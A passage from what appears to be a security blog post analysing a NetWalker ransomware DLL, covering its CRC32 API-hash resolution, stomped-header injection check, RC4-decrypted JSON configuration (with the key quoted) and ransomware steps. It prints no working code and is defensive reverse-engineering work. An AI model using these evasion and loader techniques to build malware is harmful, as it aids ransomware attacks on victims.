&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/exports.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;second important thing to note here is that it has no &lt;n&gt;imports address table&lt;/n&gt;, which implies that it might be obfuscating APIs or strings with some hashing or encryption algorithm, this can be verified by loading the dll in &lt;b&gt;PEiD&lt;/b&gt; and looking for possible algorithms in its &lt;b&gt;K&lt;/b&gt;rypto &lt;b&gt;ANAL&lt;/b&gt;yzer plugin which shows multiple references to different encoding, hashing and encrypt/decrypt algorithms in dll as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/algo_references.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If I randomly pick a CRC32 reference and look it up in dll, it is found in &lt;b&gt;sub_180005D60&lt;/b&gt; routine being used in a loop&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/crc32_loop.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;do-while loop in decompiled routine shows &lt;b&gt;CRC32 division flow&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/decompiled_crc32.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s rename this routine to &lt;b&gt;crc32_checksum&lt;/b&gt; and look for its cross references, result shows it is cross referenced two times in &lt;b&gt;sub_180001000&lt;/b&gt;, if this routine is subsequently checked for further cross references, it shows &lt;b&gt;~165&lt;/b&gt; references&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/decrypt_strings_xrefs.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can assume here that the routine &lt;b&gt;sub_180001000&lt;/b&gt; being cross referenced &lt;b&gt;~165&lt;/b&gt; times is possibly decrypting strings, I’ll rename it to &lt;b&gt;decrypt_strings&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;now let’s take a closer look at &lt;b&gt;sub_180001490&lt;/b&gt; routine which almost has all the Xrefs to &lt;b&gt;decrypt_strings&lt;/b&gt;, following code shows it is taking two arguments v1, which is being used in all of its calls and a 4-byte hex value which seems to be CRC32 hash and retrun value is being stored to different offsets of an array&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/resolve_Pis_initial_.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this routine has multiple similar code blocks but with different hash values, here it can be assumed that it is decrypting APIs from different libraries, let’s rename it to &lt;b&gt;resolve_imports&lt;/b&gt; and look for its Xrefs which leads to DLL’s main &lt;b&gt;DllEntryPoint&lt;/b&gt; routine - now it’s time to look into it dynamically.&lt;/p&gt;

&lt;p&gt;First routine that is being called by DLL is &lt;b&gt;resolve_imports&lt;/b&gt;, which in turn calls &lt;b&gt;sub_180001310&lt;/b&gt; routine, it is taking &lt;b&gt;0x84C05E40&lt;/b&gt; hash value as parameter, a quick Google search shows it is for &lt;b&gt;“ntdll.dll”&lt;/b&gt; which can also be verified with Python&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/python_ntdll_crc32.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this routine returns handle for &lt;b&gt;ntdll.dll&lt;/b&gt; library, later it takes another hash value &lt;b&gt;0xA1D45974&lt;/b&gt; which is resolved to &lt;b&gt;RtlAllocateHeap&lt;/b&gt; API, it is first called to allocate a block of memory on heap to later store resolved addresses there on different array indexes&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/get_ntdll_handle.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this routine decrypts and resolves serveral APIs from ntdll.dll, kernel32.dll, advapi32.dll, use32.dll, mpr.dll, shell32.dll, netapi32.dll, ole32.dll, oleaut32.dll and psapi.dll libraries. I wrote a simple IDAPython script &lt;a href=&quot;https://github.com/0x00-0x7F/IDAPython_scripts/blob/master/netwalker_crc32hash_resolver.py&quot;&gt;here&lt;/a&gt; which resolves CRC32 hashes and adds resolved value in comment&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/resolved.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after resolving imports, it continues to check for stomped MZ header &lt;b&gt;0xDEAD&lt;/b&gt; by first copying header value &lt;b&gt;0xDEAD&lt;/b&gt; in eax, setting up rbx with a certain address and later subtracting 0x400 from rbx in each iteration to reach image’s base address as shown by the loop in figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/stomped_MZ_header.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;if &lt;b&gt;0xDEAD&lt;/b&gt; header value is intact (i.e., making sure DLL is being run &lt;b&gt;injected&lt;/b&gt; in &lt;b&gt;explorer.exe&lt;/b&gt;), it continues further to fix &lt;b&gt;MZ&lt;/b&gt; header in memory and read image’s resources - otherwise it’ll throw &lt;b&gt;ACCESS_VIOLATION&lt;/b&gt; exception and exits&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/loadresource.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after required resource has been loaded in memory, &lt;b&gt;sub_18000EAF0&lt;/b&gt; routine processes it by first extracting first 4 bytes of data which is probably length of key, next 7 bytes (cZu-H!&amp;lt;) are extracted as &lt;b&gt;RC4 key&lt;/b&gt; which is being used to decrypt rest of the payload - following code from &lt;b&gt;sub_18000EAF0&lt;/b&gt; routine implemets &lt;b&gt;3&lt;/b&gt; recognizable RC4 loops &lt;b&gt;1.&lt;/b&gt; Initialization (creating &lt;b&gt;Substitution Box&lt;/b&gt;) &lt;b&gt;2.&lt;/b&gt; &lt;b&gt;Scrambling Substitution&lt;/b&gt; box with key to generate a &lt;b&gt;pseudo-random&lt;/b&gt; keystream &lt;b&gt;3.&lt;/b&gt; &lt;b&gt;xoring&lt;/b&gt; keystream with rest of the data&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/rc4_decrypt.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;decrypted data seems to be malware’s embedded &lt;b&gt;configuration&lt;/b&gt; in &lt;b&gt;json&lt;/b&gt; format&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/malw-config.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this can also be verified by copying resource as hex string along with 7-byte hex key on Cyberchef&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/netwalker/cyberchef_recipe.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;next routine &lt;b&gt;sub_180004600&lt;/b&gt; parses configuration to get list of file extensions which needs to be encrypted, default paths and files that should be whitelisted, attacker’s ToR info and ransomware note along with ransomware note file name and format, subsequent routines decrypt ransom note with AES decryption algorithm by using 256-bit hardcoded key, checks running processes to kill any blacklisted process and eventually performs ransomware activity.&lt;/p&gt;

&lt;p&gt;That’s it. See you next time.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sources:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;https://blog.trendmicro.com/trendlabs-security-intelligence/netwalker-fileless-ransomware-injected-via-reflective-loading/&lt;/li&gt;
  &lt;li&gt;https://any.run/report/f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be/ca44ad38-0e46-455e-8cfd-42fb53d41a1d&lt;/li&gt;
&lt;/ol&gt;</content><author><name></name></author><category term="loaders" /><category term="netwalker" /><summary type="html">Hi! I have lately started delving into maliious powershell payloads and came across a really intriguing powershell loader for “Netwalker ransomware”, performing fileless attack. Fileless techniques enable attackers to directly load and execute malicious binary in memory without actually storing it on disk by abusing available legitimate tools on victim machine. Such threats leave no trace of execution and are capable of evading any traditional security tools. This post thoroughly discusses how first stage powershell script filelessly loads and executes embedded payload through reflective Dll injection.</summary></entry></feed>